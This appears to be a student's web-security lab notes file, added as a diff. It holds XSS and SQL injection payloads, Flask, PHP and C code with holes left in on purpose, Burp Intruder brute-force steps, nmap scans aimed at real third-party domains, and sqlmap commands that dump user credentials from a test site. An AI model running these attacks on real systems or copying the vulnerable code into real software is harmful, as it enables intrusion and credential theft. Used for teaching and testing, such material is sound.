@@ -1,0 +1,589 @@
+<img src="" onerror=alert("hacked") >
+<script>alert("reflective xss attack");</script>
+<button onclick="document.body.style.backgroundColor = 'red'">Click Here </button>
+<img src="" onerror=alert("hacked") >
+
+1)  get post
+
+from flask import Flask, request, render_template_string
+from markupsafe import escape
+# <script>alert('XSS Attack!');</script>
+# Product'); DROP TABLE products; --
+
+app = Flask(__name__)
+
+# In-memory "database"
+products = []
+
+# Home route to display products and add product form
+@app.route('/')
+def home():
+    return render_template_string('''
+        <h1>Product List</h1>
+        <ul>
+            {% for product in products %}
+                <li>{{ product|safe }}</li>
+            {% endfor %}
+        </ul>
+        <h2>Add Product</h2>
+        <form action="/add" method="post">
+            <input type="text" name="product" />
+            <input type="submit" value="Add" />
+        </form>
+        <h2>Search Products</h2>
+        <form action="/search" method="get">
+            <input type="text" name="q" />
+            <input type="submit" value="Search" />
+        </form>
+    ''', products=products)
+
+# Route to add a product (POST method)
+@app.route('/add', methods=['POST'])
+def add_product():
+    product = request.form.get('product')
+    if product:
+        products.append(escape(product))
+    return 'Product added successfully! <a href="/">Back to home</a>', 200
+
+# Route to search products (GET method)
+@app.route('/search', methods=['GET'])
+def search_product():
+    query = request.args.get('q')
+    if query:
+        result = [product for product in products if query in product]
+        return render_template_string('''
+            <h1>Search Results</h1>
+            <ul>
+                {% for product in result %}
+                    <li>{{ product|safe }}</li>
+                {% endfor %}
+            </ul>
+            <a href="/">Back to home</a>
+        ''', result=result)
+    return 'No products found! <a href="/">Back to home</a>', 404
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+/////////////////////////////////////////
+import re
+from flask import Flask, request, render_template_string
+from markupsafe import escape
+
+app = Flask(__name__)
+
+# In-memory "database"
+products = []
+
+# Regular expression pattern for product name validation (alphanumeric characters, spaces, and hyphens)
+product_name_pattern = re.compile(r'^[a-zA-Z0-9\s\-]+$')
+
+# Home route to display products and add product form
+@app.route('/')
+def home():
+    return render_template_string('''
+        <h1>Product List</h1>
+        <ul>
+            {% for product in products %}
+                <li>{{ product|safe }}</li>
+            {% endfor %}
+        </ul>
+        <h2>Add Product</h2>
+        <form action="/add" method="post">
+            <input type="text" name="product" />
+            <input type="submit" value="Add" />
+        </form>
+        <h2>Search Products</h2>
+        <form action="/search" method="get">
+            <input type="text" name="q" />
+            <input type="submit" value="Search" />
+        </form>
+    ''', products=products)
+
+# Route to add a product (POST method)
+@app.route('/add', methods=['POST'])
+def add_product():
+    product = request.form.get('product')
+    if product and product_name_pattern.match(product):
+        products.append(escape(product))
+        return 'Product added successfully! <a href="/">Back to home</a>', 200
+    else:
+        return 'Invalid product name! Please enter a valid product name.', 400
+
+# Route to search products (GET method)
+@app.route('/search', methods=['GET'])
+def search_product():
+    query = request.args.get('q')
+    if query:
+        result = [product for product in products if query in product]
+        return render_template_string('''
+            <h1>Search Results</h1>
+            <ul>
+                {% for product in result %}
+                    <li>{{ product|safe }}</li>
+                {% endfor %}
+            </ul>
+            <a href="/">Back to home</a>
+        ''', result=result)
+    return 'No products found! <a href="/">Back to home</a>', 404
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+
+
+==========================================================================================================================================
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+</head>
+<body>
+    <h1>Login</h1>
+    <h2>Using GET Method</h2>
+    <form action="log.php" method="get">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username">
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password">
+        <br>
+        <button type="submit">Login</button>
+    </form>
+
+    <h2>Using POST Method</h2>
+    <form action="log.php" method="post">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username">
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password">
+        <br>
+        <button type="submit">Login</button>
+    </form>
+</body>
+</html>
+////////////////////////////////////////////////////////////////////////////////////////////////
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+</head>
+<body>
+    <h1>Login</h1>
+    <?php
+    if ($_SERVER["REQUEST_METHOD"] == "GET") {
+        // Using GET method
+        if (isset($_GET['username']) && isset($_GET['password'])) {
+            $username = $_GET['username'];
+            $password = $_GET['password'];
+
+            // Insecure authentication logic (for demonstration only)
+            if ($username === "admin" && $password === "password") {
+                echo "<p>Welcome, $username! (Using GET method)</p>";
+            } else {
+                echo "<p>Invalid username or password.</p>";
+            }
+        } else {
+            echo "<p>Username and password are required.</p>";
+        }
+    } elseif ($_SERVER["REQUEST_METHOD"] == "POST") {
+        // Using POST method
+        if (isset($_POST['username']) && isset($_POST['password'])) {
+            $username = $_POST['username'];
+            $password = $_POST['password'];
+
+            // Insecure authentication logic (for demonstration only)
+            if ($username === "admin" && $password === "password") {
+                echo "<p>Welcome, $username! (Using POST method)</p>";
+            } else {
+                echo "<p>Invalid username or password.</p>";
+            }
+        } else {
+            echo "<p>Username and password are required.</p>";
+        }
+    } else {
+        echo "<p>Unsupported request method.</p>";
+    }
+    ?>
+</body>
+</html>
+
+
+=========================================================================================================================================
+
+
+2)stack
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+struct Employee {
+    char name[20];
+    int age;
+    float salary;
+};
+
+int main(int argc, char *argv[]) {
+    struct Employee emp;
+
+    // Display usage if not enough arguments provided
+    if (argc < 4) {
+        printf("Insufficient arguments.\n");
+        printf("Syntax: %s <name> <age> <salary>\n", argv[0]);
+        exit(0);
+    }
+
+    // Copy user input to employee structure
+    strcpy(emp.name, argv[1]);
+    emp.age = atoi(argv[2]);
+    emp.salary = atof(argv[3]);
+
+    // Display employee information
+    printf("Employee Details:\n");
+    printf("Name: %s\n", emp.name);
+    printf("Age: %d\n", emp.age);
+    printf("Salary: $%.2f\n", emp.salary);
+
+    return 0;
+}
+
+//gcc -o employee_management employee_management.c
+//./employee_management John 30 50000
+//./employee_management A_really_really_long_name_that_exceeds_buffer_size 30 50000
+
+==========================================================================================================================================
+5) Reflect
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Net Banking</title>
+    <style>
+       
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Net Banking</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Account Summary</a></li>
+            <li><a href="#">Transactions</a></li>
+            <li><a href="#">Fund Transfer</a></li>
+            <li><a href="login.html" class="btn">Login</a></li>
+        </ul>
+    </nav>
+    <div class="container">
+        <div class="section">
+            <h2>Account Summary</h2>
+            <p>Balance: $10,000</p>
+            <p>Account Number: 1234567890</p>
+        </div>
+        <div class="section">
+            <h2>Recent Transactions</h2>
+            <ul>
+                <li>Transaction 1: -$100</li>
+                <li>Transaction 2: +$500</li>
+                <li>Transaction 3: -$50</li>
+            </ul>
+        </div>
+        <div class="section">
+            <h2>Fund Transfer</h2>
+            <form id="transferForm">
+                <div class="form-group">
+                    <label for="recipient">Recipient:</label>
+                    <input type="text" id="recipient" name="recipient" required>
+                </div>
+                <div class="form-group">
+                    <label for="amount">Amount:</label>
+                    <input type="number" id="amount" name="amount" required>
+                </div>
+                <button type="submit" class="btn">Transfer</button>
+            </form>
+        </div>
+    </div>
+    <footer>
+        <p>&copy; 2024 Net Banking. All rights reserved.</p>
+    </footer>
+
+    <div class="container">
+        <h2>Test for XSS Vulnerability</h2>
+        <form id="xssTestForm">
+            <p>Enter your name: <input type="text" id="nameInput"></p>
+            <p>Hello, <span id="nameDisplay"></span></p>
+            <button type="submit" class="btn">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        const xssTestForm = document.getElementById('xssTestForm');
+        const nameInput = document.getElementById('nameInput');
+        const nameDisplay = document.getElementById('nameDisplay');
+
+        xssTestForm.addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent the form from submitting and reloading the page
+            const nameValue = nameInput.value;
+            nameDisplay.innerHTML = nameValue; // Update the nameDisplay span without sanitizing user input
+        });
+    </script>
+</body>
+</html>
+
+=========================================================================================================================================
+8) stack
+
+#include <stdio.h>
+
+void recursive_function(int count) {
+    char buffer[1024]; // Allocate a large buffer on the stack
+    printf("Stack depth: %d\n", count);
+    recursive_function(count + 1); // Recursively call itself
+}
+
+int main() {
+    char input[1024]; // Buffer for user input
+
+    // Prompt user to enter data
+    printf("Enter a large amount of data (Press Enter to trigger stack overflow):\n");
+    fgets(input, sizeof(input), stdin); // Read user input
+
+    // Demonstrate stack overflow by recursively calling a function
+    recursive_function(1); // Start the recursion
+
+    return 0;
+}
+
+
+/*
+#include <stdio.h>
+
+void recursive_function(int count) {
+    char buffer[1024]; // Allocate a large buffer on the stack
+    printf("Stack depth: %d\n", count);
+    recursive_function(count + 1); // Recursively call itself
+}
+
+int main() {
+    char input[1024]; // Buffer for user input
+
+    // Prompt user to enter data
+    printf("Enter a large amount of data (Press Enter to trigger stack overflow):\n");
+
+    // Read user input safely
+    if (fgets(input, sizeof(input), stdin) != NULL) {
+        // Input read successfully
+        printf("Input: %s\n", input);
+    } else {
+        // Error reading input
+        printf("Error reading input.\n");
+        return 1;
+    }
+
+    // Demonstrate stack overflow by recursively calling a function
+    recursive_function(1); // Start the recursion
+
+    return 0;
+}
+
+
+==========================================================================================================================================
+9)
+
+
+1} SIGNUP  INTO BWAPP APP
+2} OPEN BURPSUITE AND ON THE INTERCEPT 
+3} LOGIN INTO THE BWAPP FROM THE BURPSUITE BROWSER AND ENTER WRONG PASSWORD AND AFTER THAT THE CODE WILL BE REFLECTED INTO BURPSUITE 
+4}  RIGHT CLICK AND CLICK ON SEND IT TO INTRUDER 
+5} GO TO INTRUDER AND SELECT THE WRONG PASSWORD(WITH DOLLAR SIGN) WHICH IS AT THE BOTTOM  AND CLICK ON ADD BUTTON TO ADD THE PASSWORD  
+6} GO TO PAYLOADS AND IN IT GO TO PAYLOAD SETTINGS(SIMPLE LIST) ENTER LOAD AND LOAD YOUR DICTIONARY FILE 
+7} THEN GO TO SETTINGS AND THEN CLEAR  GREP MATCH FULLY 
+8} GO TO BWAPP AGAIN AND LOGIN WITH WORNG USERNAME AND PASSWORD AND THEN LOGIN WHATEVER THE ERROR MESSAGE WILL COME COPY THAT ERROR MESSAGE AND THEN ADD THAT MESSAGE INTO THE INTRUDER SETTINGS GREP MATCH WHICH WE HAD CLEARED IN THE PREVIOUS STEP 
+9} NOW START THE ATTACK
+
+==========================================================================================================================================
+
+1.Scan any website : 
+nmap vupune.ac.in  
+
+2. Use nmap -sA to get remote firewall settings :
+sudo nmap -sA testphp.vulnweb.com 
+
+3. Use * to scan the whole subnet: 
+nmap 44.228.249.*
+
+4. Use ‘-’ to scan for a range of IP addresses:
+ nmap 44.228.249.0-10
+
+5.Use op on -sS for stealthily scanning all TCP SYN requests
+ sudo nmap -sS 44.228.249.3
+
+
+6. Use the op on -oG to write the output of nmap 
+sudo nmap -sS 44.228.249.3 -oG inp.txt
+ cat inp.txt 
+
+7. Use the op on -iL to give input via a text file 
+nmap -iL nm.txt
+
+8. Use -p for scanning specific ports 
+nmap -p 90 google.com     
+
+9. Trace the route to the target with - -trace 
+sudo nmap --trace amazon.in   
+
+10. Use the op on -O to find out the target’s 
+ sudo nmap -O amazon.in     
+
+==========================================================================================================================================
+
+
+nslookup www.volp.in
+Ping www.volp.in
+Dig www.volp.in
+Nmap (paste above ip)
+Nmap -sA -O -p 0-65535 www.volp.in
+Sudo nmap -sA -O -p 0-65535 www.volp.in
+
+
+======================================================================================================================================
+
+
+
+
+
+
+24)   admin' OR '1'='1
+
+25) sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1  -dbs
+	sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1  -D acuart -tables
+	sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1  -D acuart -columns
+	sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart  -T users -C uname -dump
+	sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart  -T users -C pass -dump 
+
+
+
+//////////////////////////////////////////////////////////////////////////////////////////////////........................................
+
+
+store
+create database feedback_db
+
+ CREATE TABLE IF NOT EXISTS feedback (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    name VARCHAR(255) NOT NULL,
+    email VARCHAR(255) NOT NULL,
+    message TEXT NOT NULL
+    );
+
+import re 
+from flask import Flask, render_template, request, redirect, jsonify, url_for
+import mysql.connector
+
+app = Flask(__name__)
+
+# Database configuration
+db_config = {
+    'host': 'localhost',
+    'user': 'root',
+    'password': 'password',
+    'database': 'feedback_db',
+}
+
+# Connect to the database
+mysql = mysql.connector.connect(**db_config)
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        name = request.form['name']
+        email = request.form['email']
+        message = request.form['message']
+        
+        # Save feedback to database
+        cursor = mysql.cursor()
+        cursor.execute("INSERT INTO feedback (name, email, message) VALUES (%s, %s, %s)", (name, email, message))
+        mysql.commit()
+        cursor.close()
+        
+        return redirect('/')
+    else:
+        cursor = mysql.cursor()
+        cursor.execute("SELECT * FROM feedback")
+        feedback = cursor.fetchall()
+        cursor.close()
+        
+        return render_template('index.html', feedback=feedback)
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+
+............................................................................
+
+<!DOCTYPE html> 
+<html lang="en"> 
+
+<head> 
+	<meta charset="UTF-8"> 
+	<meta name="viewport"
+		content="width=device-width,initial-scale=1.0"> 
+
+
+    	<style>
+            body { 
+                margin: 0; 
+                display: flex; 
+                align-items: center; 
+                justify-content: space-around; 
+                flex-direction: column; 
+                height: 80vh; 
+                background-color: #bde5d2; 
+                font-family: 'Poppins', sans-serif; 
+            }
+
+	</style>
+
+
+    
+</head> 
+
+<body> 
+	<h1>GLOBAL BANK</h1> 
+
+	<div class="form-box"> 
+		<div class="textup"> 
+			<i class="fa fa-solid fa-clock"></i> 
+			Feedback Form
+		</div> 
+        <form method="POST" action="/">
+            <label for="name">Name:</label>
+            <input type="text" id="name" name="name" required><br>
+        
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" required><br>
+        
+            <label for="message">Write your Suggestions:</label>
+            <textarea id="message" name="message" rows="4" cols="10" required></textarea>
+        
+            <button type="submit">Submit Feedback</button>
+        </form>
+	</div> 
+    
+    <div class="blockquotes-container">
+        {% for entry in feedback %}
+            <blockquote>
+                <strong>{{ entry[1] }}</strong> <i>{{ entry[3]|safe }}</i>
+            </blockquote>
+        {% endfor %}
+    </div>
+</body> 
+
+</html>
